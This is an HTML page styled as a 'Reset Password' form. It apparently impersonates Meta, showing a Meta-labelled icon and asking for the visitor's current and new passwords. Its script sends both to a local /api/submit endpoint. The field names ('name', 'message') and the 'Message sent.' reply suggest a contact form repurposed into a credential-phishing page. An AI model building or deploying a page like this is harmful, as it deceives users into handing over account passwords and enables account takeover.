<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Reset Password</title>
<style>
  :root { --bg:#f6f7f9; --card:#fff; --text:#1c2430; --muted:#5b6675; --line:#cfd5dd; --accent:#1f5eff; --ok:#16794c; --err:#b3261e; }
  @media (prefers-color-scheme: light) {
    :root { --bg:#14181f; --card:#1c222b; --text:#e8ecf1; --muted:#9aa5b4; --line:#344050; --accent:#6c93ff; --ok:#5fd09a; --err:#ff8a80; }
  }
  * { box-sizing: border-box; }
  body { margin:0; min-height:100vh; display:grid; place-items:center; padding:1.5rem; background:var(--bg); color:var(--text); font:16px/1.5 system-ui, -apple-system, "Segoe UI", sans-serif; }
  form { width:100%; max-width:26rem; background:var(--card); padding:2rem; border-radius:12px; border:1px solid var(--line); }
  h1 { margin:0 0 1.25rem; font-size:1.4rem; }
  label { display:block; margin-bottom:.35rem; font-weight:600; font-size:.95rem; }
  input, textarea { width:100%; padding:.65rem .75rem; margin-bottom:1.1rem; border:1px solid var(--line); border-radius:8px; background:transparent; color:inherit; font:inherit; }
  input:focus-visible, textarea:focus-visible, button:focus-visible { outline:2px solid var(--accent); outline-offset:2px; }
  textarea { min-height:7rem; resize:vertical; }
  button { width:100%; padding:.75rem; border:0; border-radius:8px; background:var(--accent); color:#fff; font:inherit; font-weight:600; cursor:pointer; }
  button:disabled { opacity:.6; cursor:wait; }
  #status { margin:1rem 0 0; min-height:1.5rem; font-size:.95rem; }
  #status.ok { color:var(--ok); } #status.err { color:var(--err); }
</style>
</head>
<body>
<form id="f">
  <img src="icon.jpg" alt="Meta" height="50">
  <h1>Reset Password</h1>
  <label for="name">Current Password</label>
  <input type="password" id="name" name="name" required maxlength="100" autocomplete="name">
  <label for="message">New Password</label>
  <input type="password" id="message" name="message" required maxlength="100" autocomplete="message">
  <button type="submit">Reset</button>
  <p id="status" role="status"></p>
</form>
<script>
  const f = document.getElementById('f'), s = document.getElementById('status'), b = f.querySelector('button');
  f.addEventListener('submit', async (e) => {
    e.preventDefault();
    b.disabled = true; s.className = ''; s.textContent = 'Sending…';
    try {
      const r = await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(Object.fromEntries(new FormData(f)))
      });
      if (!r.ok) throw new Error();
      f.reset(); s.className = 'ok'; s.textContent = 'Message sent.';
    } catch {
      s.className = 'err'; s.textContent = 'Could not send. Check your connection and try again.';
    } finally { b.disabled = false; }
  });
</script>
</body>
</html>
